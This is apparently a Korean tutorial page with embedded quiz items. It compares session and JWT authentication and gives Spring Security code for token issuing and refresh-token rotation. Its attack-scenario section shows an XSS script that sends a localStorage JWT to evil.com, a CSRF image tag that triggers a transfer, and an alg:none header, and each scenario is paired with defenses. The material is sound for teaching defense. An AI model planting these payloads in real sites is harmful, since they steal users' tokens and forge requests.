---
title: "JWT vs Session: 토큰 기반 인증의 허와 실"
date: 2025-12-29
draft: false
topic: "Security"
tags: ["JWT", "Session", "Authentication", "Security", "Stateless"]
categories: ["Backend Deep Dive"]
description: "세션과 토큰(JWT)의 장단점 비교, Access/Refresh Token 전략, 그리고 보안 취약점(XSS, CSRF) 방어"
module: "security"
quizzes:
  - question: "JWT(JSON Web Token)의 구조 3가지를 올바른 순서로 나열한 것은?"
    options:
      - "Header - Body - Signature"
      - "Header - Payload - Signature"
      - "Header - Payload - Footer"
      - "Meta - Data - Sign"
    answer: 1
    explanation: "JWT는 `Header`(알고리즘 정보).`Payload`(데이터/클레임).`Signature`(서명)의 3부분으로 구성되며 점(.)으로 구분됩니다."

  - question: "Session 방식과 비교했을 때 JWT(Stateless) 방식의 가장 큰 장점은?"
    options:
      - "서버 구현이 매우 간단하다."
      - "토큰을 탈취당해도 안전하다."
      - "서버 간 세션 동기화 없이 수평 확장이 용이하다(Scalability)."
      - "사용자 강제 로그아웃 처리가 쉽다."
    answer: 2
    explanation: "세션 방식은 서버 메모리나 DB에 세션을 저장해야 하므로 다중 서버 환경에서 동기화 이슈가 있지만, JWT는 토큰 자체에 검증 정보가 있어 서버 확장이 유리합니다."

  - question: "JWT를 저장할 때 XSS(Cross-Site Scripting) 공격으로부터 가장 안전한 클라이언트 저장소는?"
    options:
      - "localStorage"
      - "sessionStorage"
      - "Cookie (HttpOnly + Secure 설정)"
      - "IndexedDB"
    answer: 2
    explanation: "localStorage/sessionStorage는 자바스크립트로 접근 가능하여 XSS에 취약합니다. `HttpOnly` 쿠키는 JS 접근이 불가능하므로 토큰 탈취를 방지하는 데 가장 효과적입니다."

  - question: "Access Token의 유효 기간을 짧게 하고, 만료 시 새로운 토큰을 발급받기 위해 사용하는 긴 유효 기간의 토큰은?"
    options:
      - "Session ID"
      - "Refresh Token"
      - "API Key"
      - "Bearer Token"
    answer: 1
    explanation: "보안 강화를 위해 Access Token은 수명을 짧게(예: 30분) 가져가고, 만료 시 Refresh Token을 사용해 사용자의 개입(로그인) 없이 새 토큰을 발급받는 전략을 사용합니다."

  - question: "JWT의 `Signature` 부분을 생성할 때 사용되는 암호화 방식은?"
    options:
      - "RSA 또는 HMAC과 같은 대칭/비대칭 키 암호화"
      - "Base64 Encoding"
      - "MD5 Hashing"
      - "AES Encryption"
    answer: 0
    explanation: "서명(Signature)은 비밀키(HMAC)나 개인키(RSA)를 사용하여 생성되며, 이를 통해 토큰의 위변조 여부를 서버가 검증합니다."
study_order: 82
---

## 이 글에서 얻는 것

- **Session vs Token**: "무조건 JWT가 좋다"는 오해를 풀고, 상황에 맞는 선택 기준을 잡습니다.
- **JWT 구조**: Header, Payload, Signature의 역할과 "Base64Url 인코딩"의 의미를 이해합니다.
- **Refresh Token 전략**: 보안과 편의성을 모두 잡는 Access/Refresh 토큰 순환 구조를 배웁니다.
- **Spring Security 구현**: 실제 JWT 인증 필터, 토큰 발급/검증, Refresh Rotation까지 구현합니다.
- **보안 취약점 방어**: XSS/CSRF/토큰 탈취 시나리오별 방어 전략을 실전에 적용합니다.

---

## 1. 세션(Session) 인증: "서버가 기억한다"

전통적인 방식입니다. 사용자가 로그인하면 서버는 메모리(또는 DB/Redis)에 "철수 로그인 했음"이라고 적고, 철수에게는 `JSESSIONID` 같은 **입장권(Session ID)**만 줍니다.

### 세션 동작 흐름

```
클라이언트                          서버
   │                                │
   │  1. POST /login (id/pw)       │
   │──────────────────────────────▶│
   │                                │  세션 저장소에 기록
   │                                │  { sid: "abc123", user: "철수", role: "ADMIN" }
   │  2. Set-Cookie: JSESSIONID=abc123
   │◀──────────────────────────────│
   │                                │
   │  3. GET /api/orders            │
   │  Cookie: JSESSIONID=abc123    │
   │──────────────────────────────▶│
   │                                │  세션 저장소에서 "abc123" 조회
   │  4. 200 OK (주문 목록)         │  → 철수 확인 → 응답
   │◀──────────────────────────────│
```

### 장점

- **보안**: 입장권(ID) 자체에는 아무 정보가 없습니다. 서버가 언제든 입장권을 무효화(강제 로그아웃)할 수 있습니다.
- **구현 단순**: Spring Security의 기본 동작이 세션 기반입니다.
- **즉시 무효화**: 세션을 삭제하면 즉시 로그아웃됩니다.

### 단점

- **확장성(Scalability)**: 서버가 2대 이상이면 "A서버에 로그인한 철수"를 B서버도 알아야 합니다.
- **해결 방법들**: Sticky Session, Session Clustering, Redis 세션 저장소

### 멀티 서버 세션 공유 (Spring Session + Redis)

```java
// build.gradle
// implementation 'org.springframework.session:spring-session-data-redis'

@Configuration
@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800) // 30분
public class SessionConfig {

    @Bean
    public LettuceConnectionFactory connectionFactory() {
        return new LettuceConnectionFactory("redis-host", 6379);
    }
}
```

```yaml
# application.yml
spring:
  session:
    store-type: redis
    redis:
      namespace: myapp:session
  data:
    redis:
      host: redis-host
      port: 6379
```

이렇게 하면 어떤 서버에 요청이 가더라도 Redis에서 세션을 읽으므로 Sticky Session이 필요 없습니다.

---

## 2. JWT(Token) 인증: "토큰이 증명한다"

서버는 아무것도 기억하지 않습니다(Stateless). 대신 토큰에 "나는 철수고, 관리자 권한이 있고, 1시간 동안 유효해"라는 정보를 적어서 도장(Signature)을 찍어 줍니다.

### JWT 동작 흐름

```
클라이언트                          서버
   │                                │
   │  1. POST /login (id/pw)       │
   │──────────────────────────────▶│
   │                                │  JWT 생성 (서명 포함)
   │  2. { accessToken, refreshToken }
   │◀──────────────────────────────│
   │                                │
   │  3. GET /api/orders            │
   │  Authorization: Bearer <JWT>  │
   │──────────────────────────────▶│
   │                                │  JWT 서명 검증 (DB 조회 없음!)
   │  4. 200 OK (주문 목록)         │  → 페이로드에서 사용자 정보 추출
   │◀──────────────────────────────│
```

### 장점

- **확장성**: 어떤 서버든 토큰의 도장만 확인하면 되므로 서버를 늘리기 쉽습니다.
- **모바일 친화적**: 쿠키를 잘 안 쓰는 모바일 앱 환경에 적합합니다.
- **마이크로서비스 간 전파**: 서비스 간 토큰을 전달하면 인증 정보가 자연스럽게 전파됩니다.

### 단점

- **통제 불가**: 토큰을 탈취당하면 만료될 때까지 막을 방법이 없습니다.
- **데이터 크기**: 토큰에 정보를 많이 담으면 네트워크 트래픽이 늘어납니다.
- **Stateless의 역설**: 블랙리스트를 만들면 결국 세션과 비슷해집니다.

---

## 3. JWT 구조 해부

JWT는 `aaaaa.bbbbb.ccccc` 처럼 점 3개로 구분됩니다.

### 실제 JWT 디코딩

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6IkFETUlOIiwiZXhwIjoxNzA5MTIzNDU2fQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**1. Header** (알고리즘 + 타입):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**2. Payload** (클레임 — 데이터):
```json
{
  "sub": "user123",       // Subject: 사용자 식별자
  "role": "ADMIN",        // 커스텀 클레임
  "iat": 1709120456,      // Issued At: 발급 시간
  "exp": 1709123456       // Expiration: 만료 시간
}
```

> ⚠️ **주의**: Payload는 Base64Url로 **인코딩**만 된 것이지 **암호화**가 아닙니다.
> 누구나 디코딩해서 내용을 볼 수 있으므로, 비밀번호나 개인정보를 넣으면 안 됩니다!

**3. Signature** (서명):
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

서명은 **위변조 방지**가 목적입니다. 페이로드를 바꾸면 서명이 달라지므로 서버가 탐지합니다.

### 서명 알고리즘 비교

| 알고리즘 | 유형 | 키 관리 | 적합한 경우 |
|---------|------|--------|-------------|
| HS256 | 대칭키 (HMAC) | 서버 1개에 비밀키 | 단일 서버, 간단한 구조 |
| RS256 | 비대칭키 (RSA) | 개인키(서명) / 공개키(검증) | MSA, 외부 서비스 연동 |
| ES256 | 비대칭키 (ECDSA) | 개인키 / 공개키 | 키 크기 작음, 모바일 적합 |

**RS256이 MSA에 적합한 이유:**
```
인증 서버 (개인키로 서명)
       │
       ├── 주문 서비스 (공개키로 검증) ✅
       ├── 상품 서비스 (공개키로 검증) ✅
       └── 결제 서비스 (공개키로 검증) ✅

→ 비밀키는 인증 서버에만 있고, 다른 서비스는 공개키만 있으면 검증 가능
→ 공개키 유출돼도 토큰 위조 불가
```

---

## 4. Access Token & Refresh Token 전략

JWT의 단점(탈취 시 위험)을 보완하기 위해 두 개의 토큰을 씁니다.

### 토큰 특성 비교

| 특성 | Access Token | Refresh Token |
|------|-------------|---------------|
| 유효기간 | 짧음 (15~30분) | 김 (7~14일) |
| 저장 위치 | 메모리 / HttpOnly Cookie | HttpOnly Cookie / DB |
| 용도 | API 인증 | Access Token 재발급 |
| 서버 저장 | 없음 (Stateless) | 있음 (DB/Redis) |
| 탈취 시 위험 | 짧은 시간만 유효 | 즉시 무효화 가능 |

### 전체 흐름 (Refresh Token Rotation 포함)

```
1. 로그인
   Client → POST /auth/login { email, password }
   Server → { accessToken (30분), refreshToken (14일) }
            refreshToken을 DB에 저장

2. API 호출
   Client → GET /api/orders
            Authorization: Bearer <accessToken>
   Server → 서명 검증 → 200 OK

3. Access Token 만료 (30분 후)
   Client → GET /api/orders
   Server → 401 Unauthorized (token expired)

4. 토큰 재발급 (Refresh Token Rotation)
   Client → POST /auth/refresh { refreshToken: "RT-old" }
   Server → DB에서 RT-old 확인
          → RT-old 삭제 (1회용)
          → 새로운 { accessToken, refreshToken: "RT-new" } 발급
          → RT-new을 DB에 저장

5. 만약 RT-old가 재사용되면? (탈취 의심)
   Server → RT-old는 이미 삭제됨
          → 해당 사용자의 모든 Refresh Token 무효화
          → 재로그인 강제
```

---

## 5. Spring Security JWT 구현

### JwtTokenProvider (토큰 생성/검증)

```java
@Component
public class JwtTokenProvider {

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.access-token-validity-ms:1800000}")  // 30분
    private long accessTokenValidityMs;

    @Value("${jwt.refresh-token-validity-ms:1209600000}")  // 14일
    private long refreshTokenValidityMs;

    private SecretKey key;

    @PostConstruct
    protected void init() {
        this.key = Keys.hmacShaKeyFor(
                Decoders.BASE64.decode(secret)
        );
    }

    // Access Token 생성
    public String createAccessToken(String userId, String role) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + accessTokenValidityMs);

        return Jwts.builder()
                .subject(userId)
                .claim("role", role)
                .claim("type", "ACCESS")
                .issuedAt(now)
                .expiration(expiry)
                .signWith(key)
                .compact();
    }

    // Refresh Token 생성
    public String createRefreshToken(String userId) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + refreshTokenValidityMs);

        return Jwts.builder()
                .subject(userId)
                .claim("type", "REFRESH")
                .issuedAt(now)
                .expiration(expiry)
                .signWith(key)
                .compact();
    }

    // 토큰 검증 + 클레임 추출
    public Claims validateAndGetClaims(String token) {
        try {
            return Jwts.parser()
                    .verifyWith(key)
                    .build()
                    .parseSignedClaims(token)
                    .getPayload();
        } catch (ExpiredJwtException e) {
            throw new TokenExpiredException("토큰이 만료되었습니다");
        } catch (JwtException e) {
            throw new InvalidTokenException("유효하지 않은 토큰입니다");
        }
    }

    // Authorization 헤더에서 토큰 추출
    public String resolveToken(HttpServletRequest request) {
        String bearer = request.getHeader("Authorization");
        if (bearer != null && bearer.startsWith("Bearer ")) {
            return bearer.substring(7);
        }
        return null;
    }
}
```

### JwtAuthenticationFilter (인증 필터)

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider jwtProvider;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain)
            throws ServletException, IOException {

        String token = jwtProvider.resolveToken(request);

        if (token != null) {
            try {
                Claims claims = jwtProvider.validateAndGetClaims(token);

                // Access Token인지 확인
                if (!"ACCESS".equals(claims.get("type"))) {
                    throw new InvalidTokenException("Access Token이 아닙니다");
                }

                // SecurityContext에 인증 정보 설정
                String userId = claims.getSubject();
                String role = claims.get("role", String.class);

                List<GrantedAuthority> authorities =
                        List.of(new SimpleGrantedAuthority("ROLE_" + role));

                UsernamePasswordAuthenticationToken auth =
                        new UsernamePasswordAuthenticationToken(userId, null, authorities);

                SecurityContextHolder.getContext().setAuthentication(auth);

            } catch (TokenExpiredException | InvalidTokenException e) {
                // 토큰 검증 실패 시 인증 없이 진행 (→ 403 or 401)
                request.setAttribute("jwt_error", e.getMessage());
            }
        }

        filterChain.doFilter(request, response);
    }
}
```

### SecurityConfig (필터 등록)

```java
@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // JWT는 Stateless → CSRF 토큰 불필요
            .csrf(csrf -> csrf.disable())
            // 세션을 사용하지 않음
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            // JWT 필터를 UsernamePasswordAuthenticationFilter 앞에 등록
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }
}
```

### AuthController (로그인/재발급)

```java
@RestController
@RequestMapping("/auth")
@RequiredArgsConstructor
public class AuthController {

    private final AuthService authService;

    @PostMapping("/login")
    public ResponseEntity<TokenResponse> login(@RequestBody LoginRequest request) {
        TokenResponse tokens = authService.login(request);
        return ResponseEntity.ok(tokens);
    }

    @PostMapping("/refresh")
    public ResponseEntity<TokenResponse> refresh(@RequestBody RefreshRequest request) {
        TokenResponse tokens = authService.refresh(request.getRefreshToken());
        return ResponseEntity.ok(tokens);
    }

    @PostMapping("/logout")
    public ResponseEntity<Void> logout(@RequestBody RefreshRequest request) {
        authService.logout(request.getRefreshToken());
        return ResponseEntity.ok().build();
    }
}
```

### AuthService (Refresh Token Rotation)

```java
@Service
@RequiredArgsConstructor
@Transactional
public class AuthService {

    private final UserRepository userRepository;
    private final RefreshTokenRepository refreshTokenRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtTokenProvider jwtProvider;

    public TokenResponse login(LoginRequest request) {
        User user = userRepository.findByEmail(request.getEmail())
                .orElseThrow(() -> new AuthException("이메일 또는 비밀번호가 올바르지 않습니다"));

        if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
            throw new AuthException("이메일 또는 비밀번호가 올바르지 않습니다");
        }

        return issueTokens(user);
    }

    public TokenResponse refresh(String oldRefreshToken) {
        // 1. 토큰 검증
        Claims claims = jwtProvider.validateAndGetClaims(oldRefreshToken);
        if (!"REFRESH".equals(claims.get("type"))) {
            throw new InvalidTokenException("Refresh Token이 아닙니다");
        }

        String userId = claims.getSubject();

        // 2. DB에서 Refresh Token 존재 확인
        RefreshToken stored = refreshTokenRepository.findByToken(oldRefreshToken)
                .orElseGet(() -> {
                    // ⚠️ 이미 사용된 토큰 → 탈취 의심 → 모든 토큰 무효화
                    refreshTokenRepository.deleteAllByUserId(userId);
                    throw new TokenReusedException(
                            "Refresh Token 재사용 감지. 모든 세션이 로그아웃됩니다.");
                });

        // 3. 기존 토큰 삭제 (1회용)
        refreshTokenRepository.delete(stored);

        // 4. 새 토큰 쌍 발급
        User user = userRepository.findById(userId).orElseThrow();
        return issueTokens(user);
    }

    public void logout(String refreshToken) {
        refreshTokenRepository.findByToken(refreshToken)
                .ifPresent(refreshTokenRepository::delete);
    }

    private TokenResponse issueTokens(User user) {
        String accessToken = jwtProvider.createAccessToken(
                user.getId(), user.getRole().name());
        String refreshToken = jwtProvider.createRefreshToken(user.getId());

        // Refresh Token DB 저장
        refreshTokenRepository.save(RefreshToken.builder()
                .token(refreshToken)
                .userId(user.getId())
                .expiryDate(Instant.now().plusMillis(1209600000L)) // 14일
                .build());

        return new TokenResponse(accessToken, refreshToken);
    }
}
```

---

## 6. 토큰 저장소 비교: 어디에 저장할 것인가

| 저장소 | XSS 방어 | CSRF 방어 | 장점 | 단점 |
|--------|---------|---------|------|------|
| localStorage | ❌ | ✅ (쿠키 아님) | 구현 간단 | JS 접근 가능 → XSS 취약 |
| sessionStorage | ❌ | ✅ | 탭 닫으면 삭제 | JS 접근 가능, 새 탭 공유 안 됨 |
| HttpOnly Cookie | ✅ | ❌ (CSRF 필요) | JS 접근 불가 | CSRF 방어 별도 구현 |
| **HttpOnly + SameSite** | ✅ | ✅ | **가장 안전** | 크로스도메인 제약 |
| 메모리 (JS 변수) | ✅ | ✅ | 새로고침 시 사라짐 | UX 불편 (매번 재인증) |

### 권장: HttpOnly + Secure + SameSite Cookie

```java
// 서버에서 쿠키로 토큰 설정
public ResponseEntity<Void> loginWithCookie(LoginRequest request) {
    TokenResponse tokens = authService.login(request);

    ResponseCookie accessCookie = ResponseCookie.from("access_token", tokens.getAccessToken())
            .httpOnly(true)      // JS 접근 차단 → XSS 방어
            .secure(true)        // HTTPS만 전송
            .sameSite("Strict")  // 크로스사이트 요청에 포함 안 됨 → CSRF 방어
            .path("/api")        // API 경로에만 전송
            .maxAge(Duration.ofMinutes(30))
            .build();

    ResponseCookie refreshCookie = ResponseCookie.from("refresh_token", tokens.getRefreshToken())
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .path("/auth/refresh")  // 재발급 경로에만 전송
            .maxAge(Duration.ofDays(14))
            .build();

    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, accessCookie.toString())
            .header(HttpHeaders.SET_COOKIE, refreshCookie.toString())
            .build();
}
```

---

## 7. 보안 취약점 시나리오별 방어

### 시나리오 1: XSS로 토큰 탈취

```
공격자 → 게시판에 악성 스크립트 삽입
         <script>
           fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'));
         </script>

피해자 → 게시글 열람 → localStorage의 토큰이 공격자 서버로 전송
```

**방어:**
- HttpOnly Cookie 사용 (JS 접근 차단)
- CSP 헤더 설정 (인라인 스크립트 실행 차단)
- 출력 인코딩 (HTML/JS 컨텍스트별)

### 시나리오 2: CSRF로 인증된 요청 위조

```
공격자 → 피해자에게 악성 페이지 링크 전송
         <img src="https://bank.com/api/transfer?to=attacker&amount=1000000">

피해자 → 페이지 열람 → 쿠키가 자동 전송 → 의도하지 않은 송금 실행
```

**방어:**
- SameSite=Strict/Lax Cookie 설정
- CSRF Token (쿠키 기반 인증 시)
- 중요 동작에 재인증 요구

### 시나리오 3: Refresh Token 탈취

```
공격자 → Refresh Token 탈취 → 새 Access Token 발급 시도

[Refresh Token Rotation 적용 시]
공격자 → RT-old로 재발급 요청 → 새 토큰 쌍 발급 (RT-new)
피해자 → RT-old로 재발급 요청 → ❌ 이미 사용된 토큰!
          → 서버가 탈취 감지 → 해당 사용자 모든 RT 무효화
          → 공격자의 RT-new도 무효화됨
```

### 시나리오 4: JWT 알고리즘 혼동 (alg: none)

```json
// 공격: 알고리즘을 "none"으로 변조
{ "alg": "none", "typ": "JWT" }
```

**방어:**
```java
// ✅ 서버에서 알고리즘을 명시적으로 지정
Jwts.parser()
    .verifyWith(key)  // 특정 키로만 검증 → alg:none 자동 차단
    .build()
    .parseSignedClaims(token);
```

---

## 8. Session vs JWT 선택 가이드

### 의사결정 트리

```
서비스가 브라우저 전용인가?
├── Yes → 세션 기반이 더 안전하고 간단
│         (Spring Security 기본값 그대로)
│
└── No → 모바일 앱이나 SPA가 있는가?
         ├── Yes → JWT + Refresh Token Rotation
         │         (HttpOnly Cookie로 저장)
         │
         └── MSA에서 서비스 간 인증이 필요한가?
              ├── Yes → JWT (RS256) + OAuth2
              │         (인증 서버에서 발급, 각 서비스에서 공개키로 검증)
              │
              └── API Key로 충분한가?
                   └── Yes → API Key + Rate Limiting
```

### 하이브리드 전략 (실무에서 많이 사용)

```
클라이언트 ←→ API Gateway ←→ 내부 서비스들

[API Gateway]
- 외부: JWT 검증 + Rate Limiting
- 내부: mTLS + JWT 전파 (또는 내부 토큰 교환)

[이점]
- 외부 인증: JWT의 확장성
- 내부 통신: 서비스 간 신뢰 체인
- 토큰 블랙리스트: Gateway에서만 관리
```

---

## 9. 운영 체크리스트

### 토큰 설계

- [ ] Access Token 유효기간 30분 이하
- [ ] Refresh Token Rotation 적용 (1회용)
- [ ] 토큰 재사용 감지 시 모든 세션 무효화
- [ ] Payload에 민감 정보 미포함 (비밀번호, 개인정보)
- [ ] 서명 알고리즘 명시적 지정 (alg:none 방어)

### 저장 및 전송

- [ ] HttpOnly + Secure + SameSite Cookie 사용
- [ ] Access Token과 Refresh Token의 Cookie path 분리
- [ ] HTTPS 강제 (토큰 평문 전송 방지)

### 키 관리

- [ ] JWT 비밀키는 환경변수 또는 Secret Manager에서 주입
- [ ] 비밀키 정기 회전 절차 수립
- [ ] MSA 환경에서는 RS256/ES256 사용 (공개키 배포)

### 모니터링

- [ ] 토큰 재사용 감지 알람 설정
- [ ] 비정상적인 토큰 발급 패턴 모니터링
- [ ] Refresh Token 만료/삭제 배치 운영

---

## 연습 (추천)

1. Spring Security + JWT 인증 필터를 구현하고, Access Token 만료 시 Refresh Token으로 재발급하는 흐름을 테스트해보기
2. Refresh Token Rotation을 구현하고, 동일 Refresh Token 재사용 시 모든 세션이 무효화되는지 확인해보기
3. localStorage vs HttpOnly Cookie에 토큰을 저장했을 때 XSS 공격 시나리오를 시뮬레이션해보기
4. RS256으로 서명 알고리즘을 변경하고, 공개키만으로 토큰 검증이 되는지 확인해보기

---

## 요약

- **웹(Browser)** 위주라면 **Session**이 보안상 더 안전하고 편할 수 있습니다.
- **앱(Mobile)**이나 **MSA** 환경이라면 **JWT**가 필수적입니다.
- JWT를 쓸 때는 **Refresh Token Rotation**을 활용해 보안성을 높이고, **HttpOnly Cookie**에 저장하여 XSS를 방어하는 것이 좋습니다.
- "무조건 JWT"가 아니라, **서비스 특성에 맞는 인증 전략**을 선택하는 것이 핵심입니다.

---

## 🔗 관련 글

- [Spring Security 아키텍처 이해](/learning/deep-dive/deep-dive-spring-security-architecture/)
- [OAuth2/OIDC 인증 서버 설계](/learning/deep-dive/deep-dive-oauth2-oidc/)
- [OAuth2 소셜 로그인 구현](/learning/deep-dive/deep-dive-oauth2-social-login/)
- [CORS/CSRF/보안 헤더 실전 설정](/learning/deep-dive/deep-dive-security-cors-csrf-headers/)
- [OWASP Top 10 대응 체크리스트](/learning/deep-dive/deep-dive-owasp-top10-checklist/)
- [Spring Security 실전: OAuth2 + JWT](/learning/deep-dive/deep-dive-spring-security-oauth2-jwt-practical/)
- [Secret Management: 비밀 정보 안전하게 관리하기](/learning/deep-dive/deep-dive-secret-management/)
- [TLS Handshake 깊이 보기](/learning/deep-dive/deep-dive-tls-handshake/)
